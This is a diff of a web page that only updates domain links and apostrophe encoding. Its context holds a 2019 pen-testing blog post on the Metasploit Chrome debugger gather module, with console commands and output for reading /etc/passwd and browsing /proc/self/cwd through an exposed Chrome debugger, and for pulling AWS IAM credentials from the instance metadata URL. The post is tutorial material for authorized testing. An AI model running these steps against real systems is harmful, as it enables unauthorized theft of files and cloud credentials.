@@ -10,9 +10,9 @@
   
   
   
-  <link rel="prev" href="http://blog.evilpacket.net/2019/msf-dev-environment/" />
-  <link rel="next" href="http://blog.evilpacket.net/2020/identify-an-omg-cable/" />
-  <link rel="canonical" href="http://blog.evilpacket.net/2019/using-chrome-debugger-msf-gather-module/" />
+  <link rel="prev" href="http://evilpacket.net/2019/msf-dev-environment/" />
+  <link rel="next" href="http://evilpacket.net/2020/identify-an-omg-cable/" />
+  <link rel="canonical" href="http://evilpacket.net/2019/using-chrome-debugger-msf-gather-module/" />
   <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
   <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -36,7 +36,7 @@
 
   <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Using Chrome Debugger Metasploit Gather Module"/>
-<meta name="twitter:description" content="This last week Nick Starke got the chrome debugger metasploit module pushed over the line and merged into master. I figured I&#39;d write up a quick intro to the module and how it might be used should you happen to stumble across a chrome debugger laying around the network.
+<meta name="twitter:description" content="This last week Nick Starke got the chrome debugger metasploit module pushed over the line and merged into master. I figured I&rsquo;d write up a quick intro to the module and how it might be used should you happen to stumble across a chrome debugger laying around the network.
 Local environment If you want to startup chrome and test this yourself you can run chrome in a similar fashion.
 /Applications/Google\ Chrome."/>
 
@@ -47,18 +47,18 @@ Local environment If you want to startup chrome and test this yourself you can r
   "headline": "Using Chrome Debugger Metasploit Gather Module",
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "http:\/\/blog.evilpacket.net\/2019\/using-chrome-debugger-msf-gather-module\/"
+    "@id": "http:\/\/evilpacket.net\/2019\/using-chrome-debugger-msf-gather-module\/"
   },
   "image": {
     "@type": "ImageObject",
-    "url": "http:\/\/blog.evilpacket.net\/cover.png",
+    "url": "http:\/\/evilpacket.net\/cover.png",
     "width":  800 ,
     "height":  600 
   },
   "genre": "posts",
   
   "wordcount":  422 ,
-  "url": "http:\/\/blog.evilpacket.net\/2019\/using-chrome-debugger-msf-gather-module\/",
+  "url": "http:\/\/evilpacket.net\/2019\/using-chrome-debugger-msf-gather-module\/",
   "datePublished": "2019-12-19T09:19:25-08:00",
   "dateModified": "2019-12-19T09:19:25-08:00",
   
@@ -67,7 +67,7 @@ Local environment If you want to startup chrome and test this yourself you can r
     "name": "Adam BValdwin",
     "logo": {
       "@type": "ImageObject",
-      "url": "http:\/\/blog.evilpacket.net\/logo.png",
+      "url": "http:\/\/evilpacket.net\/logo.png",
       "width":  127 ,
       "height":  40 
     }
@@ -90,7 +90,7 @@ Local environment If you want to startup chrome and test this yourself you can r
         <nav class="navbar">
     <div class="container">
         <div class="navbar-header header-logo">
-        	<a href="http://blog.evilpacket.net/">EvilPacket</a>
+        	<a href="http://evilpacket.net/">EvilPacket</a>
         </div>
         <div class="menu navbar-right">
                 
@@ -110,7 +110,7 @@ Local environment If you want to startup chrome and test this yourself you can r
 <nav class="navbar-mobile" id="nav-mobile" style="display: none">
      <div class="container">
         <div class="navbar-header">
-            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="http://blog.evilpacket.net/">EvilPacket</a></div>
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="http://evilpacket.net/">EvilPacket</a></div>
             <div class="menu-toggle">
                 <span></span><span></span><span></span>
             </div>
@@ -138,7 +138,7 @@ Local environment If you want to startup chrome and test this yourself you can r
     <header class="post-header">
         <h1 class="post-title">Using Chrome Debugger Metasploit Gather Module</h1>
         <div class="post-meta">
-            Written by <a href="http://blog.evilpacket.net/" rel="author">Adam Baldwin</a> with ♥ 
+            Written by <a href="http://evilpacket.net/" rel="author">Adam Baldwin</a> with ♥ 
                 <span class="post-time">
                     on <time datetime=2019-12-19 >19 December 2019</time>
                 </span>
@@ -164,7 +164,7 @@ Local environment If you want to startup chrome and test this yourself you can r
           
           
 
-          <p>This last week <a href="https://twitter.com/nstarke">Nick Starke</a> got the <a href="https://blog.rapid7.com/2019/12/13/metasploit-wrap-up-45/">chrome debugger metasploit module</a> pushed over the line and merged into master. I figured I'd write up a quick intro to the module and how it might be used should you happen to stumble across a chrome debugger laying around the network.</p>
+          <p>This last week <a href="https://twitter.com/nstarke">Nick Starke</a> got the <a href="https://blog.rapid7.com/2019/12/13/metasploit-wrap-up-45/">chrome debugger metasploit module</a> pushed over the line and merged into master. I figured I&rsquo;d write up a quick intro to the module and how it might be used should you happen to stumble across a chrome debugger laying around the network.</p>
 <h2 id="local-environment">Local environment</h2>
 <p>If you want to startup chrome and test this yourself you can run chrome in a similar fashion.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222 --remote-debugging-address=127.0.0.1 --headless
@@ -175,7 +175,7 @@ Local environment If you want to startup chrome and test this yourself you can r
 + -- --=[ 7 evasion                                       ]
 
 msf5 &gt; use auxiliary/gather/chrome_debugger
-</code></pre></div><p><code>show options</code> tells us what we need to set to make this work. The most important being the RHOST of the chrome debugger we're going to gather from.</p>
+</code></pre></div><p><code>show options</code> tells us what we need to set to make this work. The most important being the RHOST of the chrome debugger we&rsquo;re going to gather from.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">msf5 auxiliary(gather/chrome_debugger) &gt; show options
 
 Module options (auxiliary/gather/chrome_debugger):
@@ -187,7 +187,7 @@ Module options (auxiliary/gather/chrome_debugger):
    RPORT     9222             yes       The target port (TCP)
    TIMEOUT   10               yes       Time to wait for response
    URL                        no        Url to fetch from remote machine.
-</code></pre></div><p>We have two paths with this module to abuse with a chrome debugger. First we can read both files and directory listings from the local disk. Second we can query a URL from the network perspective of the chrome debugger system giving us the ability to potentially access or attack local resources that we didn't have access to before.</p>
+</code></pre></div><p>We have two paths with this module to abuse with a chrome debugger. First we can read both files and directory listings from the local disk. Second we can query a URL from the network perspective of the chrome debugger system giving us the ability to potentially access or attack local resources that we didn&rsquo;t have access to before.</p>
 <h2 id="reading-a-file--directory-listing">Reading a file / directory listing</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">msf5 auxiliary(gather/chrome_debugger) &gt; set FILEPATH /etc/passwd
 FILEPATH =&gt; /etc/passwd
@@ -202,10 +202,10 @@ msf5 auxiliary(gather/chrome_debugger) &gt; run
 [*] Received Data
 [+] Stored file:///etc/passwd at /root/.msf4/loot/20191219130327_default_192.168.12.1_chrome.debugger._265252.txt
 [*] Auxiliary module execution completed
-</code></pre></div><p>Abusing proc is useful here too if you aren't use what directory you are in.</p>
+</code></pre></div><p>Abusing proc is useful here too if you aren&rsquo;t use what directory you are in.</p>
 <p><code>set FILEPATH /proc/self/cwd/</code></p>
 <h2 id="reading-from-a-remote-url">Reading from a remote URL</h2>
-<p>In this case we're going to try and access the AWS metadata url, this could be however any internal service.</p>
+<p>In this case we&rsquo;re going to try and access the AWS metadata url, this could be however any internal service.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">msf5 auxiliary(gather/chrome_debugger) &gt; set URL http://169.254.169.254/latest/meta-data/iam/security-credentials/
 URL =&gt; http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
@@ -242,13 +242,13 @@ msf5 auxiliary(gather/chrome_debugger) &gt; run
                 <span>
 
       
-        <a href="//twitter.com/share?url=http%3a%2f%2fblog.evilpacket.net%2f2019%2fusing-chrome-debugger-msf-gather-module%2f&amp;text=Using%20Chrome%20Debugger%20Metasploit%20Gather%20Module&amp;via=adam_baldwin" target="_blank" title="Share on Twitter">
+        <a href="//twitter.com/share?url=http%3a%2f%2fevilpacket.net%2f2019%2fusing-chrome-debugger-msf-gather-module%2f&amp;text=Using%20Chrome%20Debugger%20Metasploit%20Gather%20Module&amp;via=adam_baldwin" target="_blank" title="Share on Twitter">
           <i class="iconfont icon-twitter"></i>
         </a>
         
       
       
-        <a href="//www.facebook.com/sharer/sharer.php?u=http%3a%2f%2fblog.evilpacket.net%2f2019%2fusing-chrome-debugger-msf-gather-module%2f" target="_blank" title="Share on Facebook">
+        <a href="//www.facebook.com/sharer/sharer.php?u=http%3a%2f%2fevilpacket.net%2f2019%2fusing-chrome-debugger-msf-gather-module%2f" target="_blank" title="Share on Facebook">
           <i class="iconfont icon-facebook"></i>
         </a>
         
@@ -256,7 +256,7 @@ msf5 auxiliary(gather/chrome_debugger) &gt; run
       
       
       
-        <a href="//www.linkedin.com/shareArticle?url=http%3a%2f%2fblog.evilpacket.net%2f2019%2fusing-chrome-debugger-msf-gather-module%2f&amp;title=Using%20Chrome%20Debugger%20Metasploit%20Gather%20Module" target="_blank" title="Share on LinkedIn">
+        <a href="//www.linkedin.com/shareArticle?url=http%3a%2f%2fevilpacket.net%2f2019%2fusing-chrome-debugger-msf-gather-module%2f&amp;title=Using%20Chrome%20Debugger%20Metasploit%20Gather%20Module" target="_blank" title="Share on LinkedIn">
           <i class="iconfont icon-linkedin"></i>
         </a>
         
@@ -286,16 +286,16 @@ msf5 auxiliary(gather/chrome_debugger) &gt; run
         
         <section>
                 <a href="javascript:window.history.back();">Back</a></span> · 
-                <span><a href="http://blog.evilpacket.net/">Home</a></span>
+                <span><a href="http://evilpacket.net/">Home</a></span>
         </section>
     </div>
 
     <div class="post-nav">
         
-        <a href="http://blog.evilpacket.net/2019/msf-dev-environment/" class="prev" rel="prev" title="metasploit-framework Dev Environment setup issues"><i class="iconfont icon-dajiantou"></i>&nbsp;metasploit-framework Dev Environment setup issues</a>
+        <a href="http://evilpacket.net/2019/msf-dev-environment/" class="prev" rel="prev" title="metasploit-framework Dev Environment setup issues"><i class="iconfont icon-dajiantou"></i>&nbsp;metasploit-framework Dev Environment setup issues</a>
          
         
-        <a href="http://blog.evilpacket.net/2020/identify-an-omg-cable/" class="next" rel="next" title="Identify an O.MG Cable">Identify an O.MG Cable&nbsp;<i class="iconfont icon-xiaojiantou"></i></a>
+        <a href="http://evilpacket.net/2020/identify-an-omg-cable/" class="next" rel="next" title="Identify an O.MG Cable">Identify an O.MG Cable&nbsp;<i class="iconfont icon-xiaojiantou"></i></a>
         
     </div>
 
@@ -317,7 +317,7 @@ msf5 auxiliary(gather/chrome_debugger) &gt; run
         <span itemprop="copyrightYear">2019 - 2020</span>
         
          
-            <span class="author" itemprop="copyrightHolder"><a href="http://blog.evilpacket.net/">Adam Baldwin</a> | </span>
+            <span class="author" itemprop="copyrightHolder"><a href="http://evilpacket.net/">Adam Baldwin</a> | </span>
          
 
 		  <span>Crafted with ❤️ by <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreffer">KeepIt</a> & <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a></span>
